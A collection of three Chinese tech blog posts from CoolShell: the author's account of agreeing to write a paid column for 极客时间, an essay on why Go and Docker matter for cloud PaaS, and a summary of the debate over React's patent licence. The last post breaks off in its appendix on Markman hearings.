老实说，我一开始根本就不想开收费专栏的，是的，完全不想！主要是有两个原因，一方面是我在创业中，我自然是没有太多的时间，另一方面是，我以前在《[为什么我不在微信公众号上写文章](https://coolshell.cn/articles/17391.html)》也说过，我觉得知识最好的方式是被检索、讨论、引用、整理、补充和更新。所以，收费这种模式，我感觉并不利于很好的传播。但是，我为什么还干了这么一件事？这事还得从2017年6月份开始说起。

这个月，一共有三家技术社区来找我，都是希望我能去他们那边开收费专栏，其中一家就是“极客邦科技”。对于这三家来说，从一开始我就是以婉拒的姿态回应的。而“极客邦科技”来找我的时候和我说，一周写五篇，写一年，一共260篇。我当时心想，“去你的，当我啥呢，你们真以为技术文章好写啊”？然后，他们问我可以写多少，我说，我现在也就一个月一篇的节奏……



然后，就开始了时间漫长的拉锯战。极客邦这边一直从6月份和我谈到9月份，完全就是不达目的不罢休的玩法，其间，每当我说一个问题，他们就会想出一个解，我这边不断地制造不能写下去的问题，他们就不断的给出相应的解。我其实是想让他们知难而退，另外，我也不确定这帮人对于这个事有多上心，因为写技术文章是需要非常认真的态度的，所以，我提出了很多比较苛刻的条件，甚至也很直白的直接拒绝，但是他们完全就跟没有听见似的，不断的想新的方法来让我”上床”（对！就是上床，不是上船）。

- 我说，我最多一个月写2-3篇。他们和我说，我们看过了，你写的都是长文，都在5000字左右，一篇可以拆成上下篇，这样就有6篇左右了，然后，你每个月再来两篇文章，一篇是推荐一些资料或资源，一篇是回答读者的问题。这样就有8篇了，一周就可以发2篇了。

- 我说，就算是这样，我也没有时间写，我现在创业中，事多得去了，完全没精力投入。然后，他们说，不用你写，我们来帮你写。你去客户那边，叫上我们，你到大会上做分享，叫上我们，你和别人分享，也叫让我们，我们全程录音，然后帮你你整理。然后每周末的时候来找你，和你聊上2个小时。我们把内容做出来，你再精编一下就好了。而且，我们也会帮你分担创业的精力的，我们极客邦/QCon/ArchSummit会帮你的产品做推广、做市场和BD客户……

- 我说，就算是这样，我也没时间。他们说，我们还会给你配个编辑，一个不够就配两个，他们会帮你上网查资料，他们都是计算机专业的，一定是懂技术的。不会让你一个人写的。专栏这种事一定是会需要一个小的编辑团队的。

他们还甚至在晚上10点左右跑到我家门口来和我谈。这还没完，我继续刁难他们……

- 我说，技术文章相当专业，你们来试试看，于是，我给了一篇极其难读的英文论文，还有一篇技术细节非常晦涩的英文文章，我让他们不要翻译，而是读懂后理解完用自己的话，能够让一般人读懂的话写一下。这两篇文章，就算是对于有多年经验的程序员来说，也是很难读的。结果他们一周后，就搞好了，我读了一下，不算特别好，但是对于他们来说，已经很不错了。

- 我又说，我的文章中会有好些代码，有数学公式，在手机上怎么排版？阅读体验不行吧。你们还要做音频，我的文章中如果有代码，有图片，有数据公式，你让音频时怎么读？这不行吧。他们说，数学公式可以用LaTeX搞，代码排版会努力排好，同时也提供网页端的浏览。音频会这样搞，会让编辑把代码、数学公式、图片理解完后用别外的话说出来。也就是说，文章要有两个版本，一个是阅读的版本，一个是给音频师的版本。

就这样，这几个月的过程中，我心里面有了一些不一样的感觉。

- 一方面，我觉得这种“不达目的不罢休”的做法让我欣赏。因为我也在创业，创业的过程中有很多难题，也会遇到很多困难和艰辛。而极客邦他们这样的作法我是非常认可，也是非常佩服的，因为，要是换作我，我可能早放弃去寻找其它人了。但是他们没有，他们一直不断地在穷尽一切方法来说服我写专栏。能这样做的人，我觉得这个社会上少之又少，绝大多数人都是畏难和容易退缩的，所以，感觉可以深入交往和合作。

- 另外一方面，在整个过程中，我问他们，为什么你们要把这个事做得这么“重”？为什么不做得“轻”一点呢？还要录音频，音频对于技术型的文章里面有一堆坑啊，对于技术文章还有很多无法翻译的英文单词，在计算机的世界里，好多英文单词都是造出来的，音频师怎么读？(后来的确也是这样，我的音频师就把J2EE读成了“J二EE”)，他们的编辑也不知道怎么读，就上Youtube上找相关视频看老外是怎么发音的，然后标注好。而且，我的文章有时候写得太快，经常会有一些小错误，文字好改，但是还要改语音。对于这些，我都觉得好重啊，结果他们说，就是要做个“重的”，就是要做一个别人达不到的标杆，让竞争对手望而却步！

对于这两点，是让我很赞的。这样的做事精神和态度让我很佩服，是啊，在Amazon里也常说，要不断地提高标准。而且这让我深入思考了一下，一个事如果想要做好，做到极致，就算再简单的事，也会变成复杂，**这个世界上可能并不存在“轻模式”，只要你想做好，再“轻”的事都会变“重”**。他们的这些做法，让我有了一种同道中人的感觉，人总是会向比自己强的人或是跟自己比较像的人靠近的。我感觉我在创业路上，就是要和这样的人在一起，面对再难的事，都要想尽一切办法解决之，面对再轻的事，都要花心思用重的模式去做好。

而其它两个来找我做同样的事的公司，却没有让我看到他们有这样把事做成的不服输的决心和态度，真是形成了强烈的反差和对比。

于是，我就这样“从”了！这里要点名一下极客邦的两个人——我叫他们作“双蕾”：**司巧蕾** 和 **郭蕾**。（池大大也为极客时间付出了好多，因为大家都认识他了，我就弱化他一下了，嘿嘿）

#### 这个专栏主要会写什么样的内容

这是一个收费专栏，一旦收费了，我的压力也大了，因为你要写的内容就一定要能达到可以收费的价值了，不以再像个人博客一样，想写什么就什么。好在我从2003年开始我就在给好多企业做一些商业化的讲座和培训，也给一些公司做过一些商业的咨询和技术方案，包括在过去两年内帮助过一些公司打单。另外，在过去的10年内，我也在技术、职业和成长上帮助过很多年轻人。这些内容，我都没有完整或是具体地写在CoolShell中，所以，我觉得这些内容是可以放在这个收费专栏的。

此外，我在CoolShell上的文章都是不系统的，是碎片式的，还有一些只是知识，还不是认识。而我过去成长的20年，我的经验和知识已经在某些方面形成了比较完整的体系，而且有一些技术也能看到本质上的东西。所以，我觉得这些东西是可以呈现在这个专栏内的，都是非常有商业价值的，一定是可以帮助到大家的。当然，其中的一些东西，不是初级入门的程序员能够看懂的，需要有一定的工作经验和基础知识。

而在我入行的这20年来，我觉得对于一个企业，一个团队，一个个体的程序员来说，有三件事是密不可分，也是相辅相成的，这三件事就是：技术、发展和管理。每个人，每个团队，每个企业，都需要认真地面对技术，不断地挑战新的技术，并且还要非常认真地发展个人和团队，而这些都需要对自我的管理或是对团队和公司的管理才能更高效的达成。

所以，我的专栏会由这三部份构成:

- **技术**。对于技术方面，我不会写太多关于知识点的东西，因为这些知识点大家可以自行Google可以RTFM。我要写就一定是以体系化的，而且要能直达技术的本质。我入行这20年来，我最擅长的是针对各种大规模的系统，所以，我会有2-3个和分布式系统相关的系列文章，然后，我学过也用过好多编程语言，所以，我也会有一系列的关于编程本质的文章，而我对一些基础知识研究的也比较多，所以，还会有一系列的和基础知识相关的文章。当然，其中还会穿插一些其它的技术文章，比如一些热点事件，还有一些经验之谈，包括，我会把我的《[程序员技术练级攻略](https://coolshell.cn/articles/4990.html)》在这个专栏里重新再写一遍。这些东西一定会让大家有醍醐灌顶的感觉。

- **成长**。在过去这20年中，我感觉得到，很多人都会非常在意自己的成长。所以，我会分享一堆我亲身经历的，也是我自己实验的一定和个人发展相关的文章。比如，像技术变现啊、如何面试、如何选择新的技术、如何学习、如何管理自己的时间、如何管理自己的老板和工作、如何成为一个Leader……这些东西一定会对大家有用。但是，我这里一定不会有速成的东西。一切都是要花时间和精力的。如果你想要速成，你不应该来订阅我的专栏。

- **管理**。这20年，我觉得做好技术工作，得做好技术的管理工作，只有管理好了软件工程和技术团队，技术才能发挥出最大的潜力。大多数的技术都是管理上的问题。所以，我会写上一系列的和管理相关的文章，管理三个要素，团队、项目和管理者自己。所以，我会从这三个方面写一系列包括，人员招聘、绩效考核、提升士气、解决冲突、面对变化、沟通说服、项目管理、任何排期、会议、远程管理……等等一系列的文章。这些东西都是我在外企时，接受到的世界顶级管理培训机构培训内容，我会把我的实践写出来分享给大家。这其中一定少不了亚马逊相关的各种实践。这些东西，我和很多公司和大佬都讲过，到目前为止还没有人不赞的。

现在，我这个专栏写了快三个月了，第一部分和第二部分已经有一些呈现了。我周末和假期的时间也完全都搭进去了 ;-)。后面的文章还在和我的编辑一起在整理和书写中，我感觉这个专栏只收199一年简直是太便宜了，我有点想涨价的冲动了。哈哈。

#### 幕后团队

最后说一下我的专栏编辑——她叫杨爽！以前是CSDN的程序员杂志的编辑，后来去了七牛，现在和我一起做我的这个专栏。她对我的这个专栏上的投入非常大，除了帮助我编辑文章，还要帮音频师标注语气，英文发音，以及音频版的文章，还要深度参与写作，**有的文章我只给了一个大纲，甚至只是一个方向，或是一系列的素材，然后都是她来操刀的，比如“推荐阅读”的文章、还有技术领导力的下篇，基本上是由杨爽来出第一版，然后我再上面再做修改和补充**。她说，写技术文章真是太累了，尤其是帮你编辑你的分布式系列的文章，我基本都把这些技术都看了个大概了。我调侃到，如果你完全搞懂了，你就不用做编辑了，你可以做技术去了，嗯，而且，可以变成架构师了。

另外，她会深度的编辑我的文章，尤其是每篇文章最后的一些总结或是一些问题都是她写的。在我的一篇答疑的文章中，她自己加入了一个观点——“很多事情能做到什么程度，其实在思想的源头就被决定了，因为它会绝大程度地受到思考问题出发点、思维方式、格局观、价值观等因素的影响”，这个观点被读者当成是我的观点，其实，这是杨爽的观点，当然我也很同意。

所以，我的这个专栏离不开杨爽的付出，我和她一般都是在晚上或是周末沟通，因为平时我的时候都被创业的事给占据了。所以，她也只能适配我的时间，但她真的很努力，我能感觉得到她想把文章的质量不断提高的迫切。

关于专栏的音频师，他叫柴巍，是天津广播电台的主持人，一个89年的小伙子，网上他的[个人信息在这里](http://www.radiotj.com/zcrdd/system/2014/04/16/000472670.shtml)。他跨界来读这些技术文章的确对他来说非常不容易，因为一方面这文章里讲的这些东西他都看不懂，另外，他也不认识我，我脾气和性格他不知道，所以，他读我的文章里，并不能完全准确地把握相关的语气。这就需要杨爽来帮他标注和调整，有些地方，不断地修改，不断地录，大家知道，录音和写文章不一样，文章要修改很简单，语音要修改就非常麻烦，得把上下文全都一并重新再读一篇，这个过程的确难，杨爽在其中也花费了大量的时间和这个小伙子沟通和调整。

在一开始，有播音腔，也被读者吐槽了，他自己后来一直在调整，目前越来越符合咱们的要求。这个小哥是非常努力和有挑战精神的，他在这个过程中，也是非常信守承诺的。去年12月6日，录分布式系统冰与火那篇文章时，他上午有自己的工作，下午要开会，晚上又有单位活动，他还是活动的主持人，他实在是没有时间了。我也和我的编辑说，算了，先发文章，后面再补音频。但是他还是挤时间把音频录出来了，期间，我还不知情地又修改了一下文章，他又配合修改，直到完全改好。打车去参加活动，还好提前20分钟赶到，没有耽误主持活动。

唠唠叨叨写这么多，也没什么干货！算是一份记录吧。也希望大家能够从我的专栏中看到这个团队的确是在用心做事的，是的，能认识这些人，还能一起合作，在我的人生经历上是非常有价值的事了。

希望大家在新的一年里也能遇到这样的人。我们一起加油！

![img](photo/ride_or_die.jpg)

图片来自：电影《速度与激情》——Ride or Die

 

（全文完）

# GO语言、DOCKER 和新技术

#####  [2017年10月30日 ](https://coolshell.cn/articles/18190.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [70 条评论](https://coolshell.cn/articles/18190.html#comments) 131,887 人阅读

![img](photo/golang.docker-360x200.png)上个月，作为 Go 语言的三位创始人之一，Unix 老牌黑客罗勃·派克（Rob Pike）在新文章“[Go: Ten years and climbing](https://commandcenter.blogspot.com/2017/09/go-ten-years-and-climbing.html)”中，回顾了一下 Go 语言的发展过程。其中提到，Go 语言这十年的迅猛发展大到连他们自己都没有想到，并且还成为了云计算领域中新一代的开发语言。还提到了，中国程序员对 Go 语言的热爱完全超出了他们的想象，甚至他们都不敢相信是真的。

这让我想起，我在 2015 年 5 月份拜访 Docker 公司在湾区的总部时，Docker 负责人也和我表达了相似的感叹：他们完全没有想到居然中国有那么多人喜欢 Docker，而且还有这么多人在为 Docker 做贡献，这让他们感到非常意外。此外，还跟我说，中国是除了美国本土之外的另一个如此喜欢 Docker 技术的国家，在其它国家都没有看到。

的确如他们所说，Go 语言和 Docker 这两种技术已经成为新一代的云计算技术，而且可以看到其发展态势非常迅猛。而中国也成为了像美国一样在强力推动这两种技术的国家。这的确是一件让人感到非常高兴的事，因为中国在跟随时代潮流这件事上已经做得非常不错了。

然而，从 2014-2015 年我在阿里推动 Docker 和 Go 语言的痛苦和失败过程中，以及这许多年来，有很多很多人问我是否要学 Go 语言，是否要学 Docker，Go 和 Docker 是否能用在生产线上，这些问题看来，对于 Go 语言和 Docker 这两种技术，在国内的技术圈中有相当大的一部分人和群体还在执观望或是不信任的态度。

所以，我想写这篇文章，从两个方面来论述一下我的观点和看法。

- 一个方面，为什么 Go 语言和 Docker 会是新一代的云计算技术。
- 另一个方面，作为技术人员，我们如何识别什么样的新技术会是未来的趋势。

这两个问题是相辅相成的，所以我会把这两个问题揉在一起谈。



虽然 Go 语言是在 2009 年底开源的，但我是从 2012 年才开始接触和学习 Go 语言的。我只花了一个周末两天的时间就学完了，而且在这两天，我还很快地写出了一个能工作很好的网页爬虫程序，以及一个简单的高并发文件处理服务，用于提取前面抓取的网页的关键内容。这两个程序都很简单，总共才写了不到 500 行代码。

我当时对 Go 语言有几点体会。

**第一，语言简单，上手快。**Go 语言的语法特性简直是太简单了，简单到你几乎玩不出什么花招，直来直去的，学习曲线很低，上手非常快。

**第二，并行和异步编程几乎无痛点。**Go 语言的 Goroutine 和 Channel 这两个神器简直就是并发和异步编程的巨大福音。像 C、C++、Java、Python 和 JavaScript 这些语言的并发和异步方式太控制就比较复杂了，而且容易出错，而 Go 解决这个问题非常地优雅和流畅。这对于编程多年受尽并发和异步折磨的我来说，完全就是让我眼前一亮的感觉。

![img](photo/golang.01.png)

（图片来自 Medium：[Why should you learn Go?](https://medium.com/@kevalpatel2106/why-should-you-learn-go-f607681fad65)）

**第三，Go 语言的 lib 库麻雀虽小五脏俱全。**Go 语言的 lib 库中基本上有绝大多数常用的库，虽然有些库还不是很好，但我觉得不是问题，因为我相信在未来的发展中会把这些问题解决掉。

**第四，C 语言的理念和 Python 的姿态。**C 语言的理念是信任程序员，保持语言的小巧，不屏蔽底层且底层友好，关注语言的执行效率和性能。而 Python 的姿态是用尽量少的代码完成尽量多的事。于是我能够感觉到，Go 语言想要把 C 和 Python 统一起来，这是多棒的一件事啊。

![img](photo/golang.02.png)

（图片来自 Medium：[Why should you learn Go?](https://medium.com/@kevalpatel2106/why-should-you-learn-go-f607681fad65)）

所以，即便 Go 语言存在诸多的问题，比如垃圾回收、异常处理、泛型编程等，但相较于上面这几个优势，我认为这些问题都是些小问题。于是就毫不犹豫地入坑了。

当然，一个技术能不能发展起来，关键还要看三点。

- **有没有一个比较好的社区。**像 C、C++、Java、Python 和 JavaScript 的生态圈都是非常丰富和火爆的。尤其是有很多商业机构参与的社区那就更为人气爆棚了，比如 Linux 的社区。
- **有没有一个工业化的标准。**像 C、C++、Java 都是有标准化组织的。尤其是 Java，其在架构上还搞出了像 J2EE 这样的企业级标准。
- **有没有一个或多个杀手级应用。**C、C++ 和 Java 的杀手级应用不用多说了，就算是对于 PHP 这样还不能算是一个好的编程语言来说，因为是 Linux 时代的第一个杀手级解决方案 LAMP 中的关键技术，所以，也发展起来了。

上述的这三点是非常关键的，新的技术只需要占到其中一到两点就已经很不错了，何况有的技术，比如 Java，是三点全占到了，所以，Java 的发展是如此好。当然，除了上面这三点重要的，还有一些其它的影响因素，比如：

- **学习曲线是否低，上手是否快。**这点非常重要，C++ 在这点上越做越不好了。
- **有没有一个不错的提高开发效率的开发框架。**如：Java 的 Spring 框架，C++ 的 STL 等。
- **是否有一个或多个巨型的技术公司作为后盾。**如：Java 和 Linux 后面的 IBM、Sun……
- **有没有解决软件开发中的痛点。**如：Java 解决了 C 和 C++ 的内存管理问题。

用这些标尺来量一下 Go 语言，我们可以清楚地看到：

- Go 语言容易上手；
- Go 语言解决了并发编程和写底层应用开发效率的痛点；
- Go 语言有 Google 这个世界一流的技术公司在后面；
- Go 语言的杀手级应用是 Docker，而 Docker 的生态圈在这几年完全爆棚了。

所以，Go 语言的未来是不可限量的。当然，我个人觉得，Go 可能会吞食很多 C、C++、Java 的项目。不过，Go 语言所吞食主要的项目应该是中间层的项目，既不是非常底层也不会是业务层。

也就是说，Go 语言不会吞食底层到 C 和 C++ 那个级别的，也不会吞食到高层如 Java 业务层的项目。Go 语言能吞食的一定是 PaaS 上的项目，比如一些消息缓存中间件、服务发现、服务代理、控制系统、Agent、日志收集等等，没有复杂的业务场景，也到不了特别底层（如操作系统）的中间平台层的软件项目或工具。而 C 和 C++ 会被打到更底层，Java 会被打到更上层的业务层。这是我的一个判断。

好了，我们再用上面的标尺来量一下 Go 语言的杀手级应用 Docker，你会发现基本是一样的。

- Docker 上手很容易。
- Docker 解决了运维中的环境问题以及服务调度的痛点。
- Docker 的生态圈中有大公司在后面助力。比如 Google。
- Docker 产出了工业界标准 OCI。
- Docker 的社区和生态圈已经出现像 Java 和 Linux 那样的态势。
- ……

所以，早在 3、4 年前我就觉得 Docker 一定会是未来的技术。虽然当时的坑儿还很多，但是，相对于这些大的因素来说，那些小坑儿都不是问题。只是需要一些时间，这些小坑儿在未来 5-10 年就可以完全被填平了。

同样，我们可以看到 Kubernetes 作为服务和容器调度的关键技术一定会是最后的赢家。这点我在去年初就能够很明显地感觉到了。

关于 Docker 我还想多说几句，这是云计算中 PaaS 的关键技术，虽然，这世上在出现 Docker 之前，几乎所有的要玩公有 PaaS 的公司和产品都玩不起来，比如：Google 的 GAE，国内的各种 XAE，如淘宝的 TAE，新浪的 SAE 等。但我还是想说，**PaaS 是一个被世界或是被产业界严重低估的平台。**

**PaaS 层是承上启下的关键技术，任何一个不重视 PaaS 的公司，其技术架构都不可能让这家公司成长为一个大型的公司**。因为 PaaS 层的技术主要能解决下面这些问题。

- **软件生产线的问题。**持续集成和持续发布，以及 DevOps 中的技术必需通过 PaaS。
- **分布式服务化的问题。**分布式服务化的服务高可用、服务编排、服务调度、服务发现、服务路由，以及分布式服务化的支撑技术完全是 PaaS 的菜。
- **提高服务的可用性 SLA。**提高服务可用性 SLA 所需要的分布式、高可用的技术架构和运维工具，也是 PaaS 层提供的。
- **软件能力的复用。**软件工程中的核心就是软件能力的复用，这一点也完美地体现在 PaaS 平台的技术上。

老实说，这些问题的关键程度已经到了能判断一家依托技术的公司的研发能力是否靠谱的程度。没有这些技术，依托技术拓展业务的公司几乎没有可能发展得规模很大。

在后面，我会在“[极客时间](https://time.geekbang.org/)”[我的付费专栏](https://time.geekbang.org/column/intro/48)里另外写几篇文章详细地讲一下分布式服务化和 PaaS 平台的重要程度。

最后，我还要说一下，为什么要早一点地进入这些新技术，而不是等待这些技术成熟了后再进入。原因有这么几个。

> 技术的发展过程非常重要。我进入 Go 和 Docker 的技术不能算早，但也不算晚，从 2012 年学习 Go，到 2013 年学习 Docker 到今天，我清楚地看到了这两种技术的生态圈发展过程。让我收获最大的并不是这些技术本身，而是一个技术的变迁和行业的发展。

从中，我看到了非常具体的各种思潮和思路，这些东西比起 Go 和 Docker 来说更有价值。因为，这不但让我重新思考我已掌握的技术以及如何更好地解决已有的问题，而且还让我看到了未来。我不但有了技术优势，而且这些知识还让我的技术生涯多了很多的可能性。

> 这些关键新技术，可以让你拿到技术的先机。这些对一个需要技术领导力的个人或公司来说都是非常重要的。

一个公司或是个人能够占有技术先机，就会比其它公司或个人有更大的影响力。一旦未来行业需求引爆，那么这个公司或是个人的影响力就会形成一个比较大的护城河，并可以快速地产生经济利益。

近期，在与中国移动、中国电信以及一些股份制银行进行交流的过程中，我已看到通讯行业、金融行业对于 PaaS 平台的理解已经超过了互联网公司，而我近 3 年来在这些技术上的研究让我也从中受益非浅。

所以，Go 语和 Docker 作为 PaaS 平台的关键技术前途是无限的，我很庆幸赶上了这个浪潮，也很庆幸在 3 年前我就看到了这个趋势，现在我也在用这些技术开发相关的技术产品，助力于为高速成长的公司提供这些关键技术。

 

**最后注明一下：**

**这篇文章于上周发布于[“极客时间”的我的付费专栏](https://time.geekbang.org/column/intro/48)中。极客时间中的付费是我受Geekbang邀请写的一个付费专栏，因为过去10多年给企业有过很多内训，过去2年又给好多企业做过一些咨询工作，所以，我会把一些商业化的内容写在极客时间里，当然，也会有一些我的新文章。关于这个事，我后面我专门开一篇文章说一下。（大家可以到 Apple的App Store上搜极客时间，Android版本等到12月初吧）
**

（全文完）

# 关于FACEBOOK 的 REACT 专利许可证

#####  [2017年09月19日 ](https://coolshell.cn/articles/18140.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [33 条评论](https://coolshell.cn/articles/18140.html#comments) 66,765 人阅读

![img](photo/react_patent-360x200.jpg)随着Apache、百度、Wordpress都在和Facebook的React.js以及其专利许可证划清界限，似乎大家又在讨论Facebook的这个BSD+PATENT的许可证问题了。这让我想起了之前在Medium读过的一篇文章——《[React, Facebook, and the Revocable Patent License, Why It’s a Paper](https://medium.com/@dwalsh.sdlr/react-facebook-and-the-revokable-patent-license-why-its-a-paper-25c40c50b562)》，我觉得那篇文章写的不错，而且还是一个会编程的律师写的，所以有必要把这篇文章传播到中文社区这边来。注意，我不会全部翻译，我只是用我的语言来负责搬运内容和观点，我只想通过这篇文章让大家了解一下这个世界以及专利相关的知识，这样可以避免你看到某乎的“怎么看待XXX”这类的问题时人云亦云，能有自己的独立思考和自我判断。;-)

这篇文章的作者叫Dennis Walsh，他自称是亚历桑那和加利福尼亚州的律师，主要针对版权法和专利诉论的法律领域。但是这个律师不一样，他更很喜欢商业和软件多一些。现在他用React/GraphQL/Elixir在写一个汽车代理销售相关的软件，而且已经发布到第2版了。

首先，作者表明，专利法经常被人误解，因为其实充满了各种晦涩难懂的法律术语，所以，作者用个例子来讲述专利的一个原则 —— **专利并不是授于让你制造或开发的权利，而是授予你可以排他的权利。（**事实上似乎也是这样，申请专利很多时候都不是为了制作相关的产品，而是为了防止别人使用类似的技术制作相关的产品）



如果有公司X为铅笔申请了专利，而另一家公司Y为把用于铅笔的橡皮擦申请了专利。那么，公司X可以阻止公司Y来生产铅笔，而对带橡皮擦的铅笔没办法，但是公司Y的专利可以让公司X不能生产带有橡皮擦的铅笔。

所以，公司Y的橡皮擦专利又被广泛地叫作“[Blocking Patent](https://definitions.uslegal.com/b/blocking-patent/)”。公司Y不能说他发明了铅笔，因为这是公司X的专利，但是，他们可以让公司X无法对铅笔做出某些改进。

于是，因为这种 Blocking Patent 存在，对于开源的公司是不利的，因为根据上面的那个例子来说，开源公司就是公司X，他们做了一个基础的软件，而公司Y在上面做了些改进，并注册成了专利，从而导致开源的公司X无法对它基础开源软件作出被公司Y专利阻止的改进，开源的公司X希望能够自由地使用公司Y的橡皮擦专利，因为毕竟是它发明了铅笔并放弃了铅笔的专利。

于是就出来了“专利反击条款”（[Patent Retaliation Clauses](https://en.wikipedia.org/wiki/Software_patents_and_free_software#Patent_retaliation)）。一般来说有两种专利条款，一种是弱条款，一种是强条款。

Weak Patent Retaliation Clauses – 这种条款声明，如果许可证持有者用某个专利来打击许可证颁布者，那么专利就视为终止。用人话来表达就是，公司X做了一个开源铅笔，而公司Y注册了橡皮檫专利。此时，公司X做了一支带像皮擦的铅笔，而公司Y马上对公司X提起专利侵权诉讼。那么，公司Y就失去了对底层铅笔的专利控制。（正如前面所说的，公司Y的橡皮擦专利因为在起诉公司X的开源铅笔，而失去了对开源铅笔的专利排他权利）

Strong Patent Retailiation Clauses – 这种条款声明比“弱条款”要的更多。具体来说就是，任何专利声明终结许可证，而不管这个专利有没有和你基础的软件有关系。用人话来说就是，公司Y使用他们的热气球专利来起诉公司X，那么公司Y就失去了他们对铅笔的专利限制。

我个人理解起来，这两种条款看上去是防御性质的。

Facebook的React的Patent License如下：

> The license granted hereunder will terminate, automatically and without notice,if you (or any of your subsidiaries, corporate affiliates or agents) initiatedirectly or indirectly, or take a direct financial interest in, any Patent Assertion: (i) against Facebook or any of its subsidiaries or corporateaffiliates, (ii) against any party if such Patent Assertion arises in whole orin part from any software, technology, product or service of Facebook or any ofits subsidiaries or corporate affiliates, or (iii) against any party relating to the Software. Notwithstanding the foregoing, if Facebook or any of itssubsidiaries or corporate affiliates files a lawsuit alleging patentinfringement against you in the first instance, and you respond by filing apatent infringement counterclaim in that lawsuit against that party that isunrelated to the Software, the license granted hereunder will not terminateunder section (i) of this paragraph due to such counterclaim.

这些条款中和基础软件没有任何关系，所以，**这个条款是“强专利反击条款”**。

在后面，本文的作者又解解释了，为什么React的“强专利反击条款”就跟没有似的。他在文中针对一些歇斯底里的言论，如：“Facebook不用害怕专利诉讼了，而且他可以随时偷袭你家的专利仓库”，也作出了一些解释来分析这个事。

Contractural Liability – 意思是说，专利方面的东西只会影响专利上的事，而不会影响和专利无关的事，React底层协议是BSD-3许可证还是会被保留。换句话说，React的“强专利反击条款”只生效于专利层面，而不会对非常专利的软件使用产生问题，如果和专利无关，React还是走BSD-3的许可协议。

Copyright Liability – 这个和Contractural Liablitity 一样。作者说，如果有人有特别的案例或是有说服力的论据来说明Facebook的这个条款会作用于非专利的地方，那么，请告诉他。

Patent Liability – 专利的责任和损害是两件事，非专业人士总是会把其搞混。

第一个问题是Liability， 要搞清这个事，得搞清“Patent’s Claims”，而不是这个技术的技术规格说明，技术规格说明和权力主张是两码事。作者说，现在的很多专利都是一些想法，很多投机份子随便一拍脑袋就发明出一个想法，然后就去注册专利了。但是可以被用来法律执行的只有“Patent’s Claims”（专利的权利主张），而不是那些想法。这些权利主张相当相当的晦涩难读，而且是会故意被模糊掉的，因为，当你清楚的定义了你的发明是什么，那么，就可以清楚的定义出来什么不是你的发明。比如：一个铅笔专利权利主张里说，“这一个用石墨和木头组合起来的写字工具”，那么，只要我不用木头和石墨来做组合，而是用塑料来做组合，那么我就不是专利侵权。所以，一般来说，专利主张是会更为通用一些，比如，“这是一个用于涂画表面的装置，其包括：与涂画端相连的握持端”。作者这里给了一个[苹果公司的滑动解锁专利](https://www.google.com/patents/US8046721)的示例。可以感受一下产品规格说明和专利权利主张完全是两码事。

专利这些事，在法律界里是非常非常困难作出评估的。所以，这个社会每年都会给律师们几十亿美金来一遍又一遍地回答这些问题，而且律师还经常回答错了。而对于美国的法律，对于专利诉讼会有一个叫[Markman hearing的审前听证会](https://en.wikipedia.org/wiki/Markman_hearing)（马克曼听证会），自从1996年美国最高法的“[马克曼诉威斯幽仪器公司案](https://en.wikipedia.org/wiki/Markman_v._Westview_Instruments,_Inc.)”这个听证会就变成了一个惯例，美国联邦法院用这个听证会来向决定专利权利主张的解释，而且，上诉法院还经常性的推翻审判法院的裁决。（对于美国法律来说，一般是法官认证法律，陪审团认定事实，然而，对于专利而言，1996年的那个案件认为专利术语是一个需要法官决定的法律问题，而不是陪审团决定的事实问题。关于马克曼听证会的事，可以参看本文未尾的附录）

所以，要决定Facebook的专利责任，我们需要评估Facebook的专利及其权利主张，而不是技术规格说明。具体来说，要明确Facebook对于React这个底层技术的专利权利主张是什么？但是作者搜了一下，发现什么也没有找到。也就是说，对于USPTO（美国专利商标局）或法院来说，他们没办法对Facebook的这样没有为React申请专利的方式来执行任何和专利的诉讼，也就是说，Facebook的这个React License的条款，美国政府是无法在法律上支持的。

第二个问题是专利损害。就算是Facebook可以评估出来一个合法可执行的专利来保护React，对于专利损害也是很有问题的。作者说他到目前还没有发现一个开源软件被专利侵权的事，就算有这样的案例，也不会是这里说的这个事。作者觉得在这个事上操作起来就是一个笑话。

另外，作者认为，React 专利许可证这个事就是个纸老虎。因为，一方面，这个专利不像电信通讯里的那些专利，你拿不掉。作者认为要从你的代码中把React去掉虽然难，但是也不是什么很难的事，另外，要打这样的专利官司，一般来说，在美国至少要花100-200万美金的费用才能发起诉讼，而要胜诉则需要需要200多万到2000万美金的费用，你觉得你要花多钱才能把React从你的代码库中剔除？肯定比这钱少。

作者还认为，Facebook玩这个事虽然出发点不错，但是感觉并不聪明，从目前的情况看下来，就像他想咬你一口，但却没有牙。

后面，作者还说了一下，转成别的框架会不会有问题？比如：你用Preact/Vue或是你自研的东西？作者说，未必，如果Facebook真的为React注册了专利，比如：React里的组件技术、虚拟DOM渲染技术等等。那么，你用Preact/Vue或是带这样技术的自研的框架，那么，从你使用的第一天就在侵犯Facebook的专利权了。然而，使用React反而不会有这么大的风险，因为Facebook让你免费的用React。作者说，用别的框架的法律风险比用其它替代品的风险更高。

后面，作者也更新了一篇文章 《[Using GraphQL? Why Facebook Now Owns You](https://medium.com/@dwalsh.sdlr/using-graphql-why-facebook-now-owns-you-3182751028c9)》，意思是，用React可能还好，但是用GraphQL就有问题了。因为找到了GraphQL的专利—— [“Graph Query Logic”](https://patents.google.com/patent/US9646028)。

后来我查了一下，我发现，React也有个相关的专利—— “[Efficient event delegation in browser scripts](https://patents.google.com/patent/US9003278) ”，看上去和虚拟DOM渲染有关。Holy Shit!

好了，用还是不用React我也不知道，总之，这个世界比较复杂，我只是想借这篇文章来学习一下法律上的相关东西，欢迎听到大家的观点。

最后，请允许我调侃一下来结束本文——“不用担心React的许可证问题，因为前端不是一年半就用新的框架重写一次么？”哈哈。

**更新：Facebook官方于20017年9月23日在其官方blog上发贴《[Relicensing React, Jest, Flow, and Immutable.js](https://code.facebook.com/posts/300798627056246/relicensing-react-jest-flow-and-immutable-js)》决定取消之前的带专利的许可证。**

#### 延伸阅读

##### 马克曼听证会 – Markman Hearing

马克曼听证会的一些背景知识，下面的文字来源于《[“马克曼听证”制度的由来及启示](http://www.sipo.gov.cn/sipo2013/mtjj/2013/201303/t20130320_788543.html)》

与美国专利诉讼的悠长历史相比，1996年才经美国最高法院确立的“马克曼听证”（Markman Hearing，也称为Claim Construction，即权利要求书的解释）无疑是一项年轻的制度。但由于几乎所有的专利侵权诉讼中都会遇到涉案专利权利要求书的解释这一核心问题，且因“马克曼听证”结果往往清楚地预示了案件结果，经“马克曼听证”获得有利结论的一方一旦据此向法庭提起不审即判的动议，专利侵权诉讼往往可就此快速了结，因此该制度的确立成为美国专利诉讼历史上的一件大事。

“马克曼听证”制度的由来

